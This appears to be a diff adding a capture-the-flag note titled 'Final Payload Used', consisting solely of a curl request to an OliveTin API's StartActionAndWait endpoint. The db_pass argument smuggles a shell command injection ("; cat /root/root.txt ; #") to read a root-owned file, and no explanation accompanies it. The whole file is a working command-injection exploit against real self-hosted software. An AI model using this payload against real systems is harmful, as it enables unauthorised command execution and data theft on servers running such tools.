@@ -1,0 +1,6 @@
+Final Payload Used.
+
+
+curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
+  -H "Content-Type: application/json" \
+  -d "{\"actionId\":\"backup_database\",\"arguments\":[{\"name\":\"db_user\",\"value\":\"backup_svc\"},{\"name\":\"db_pass\",\"value\":\"x' ; cat /root/root.txt ; #\"},{\"name\":\"db_name\",\"value\":\"production\"}]}"
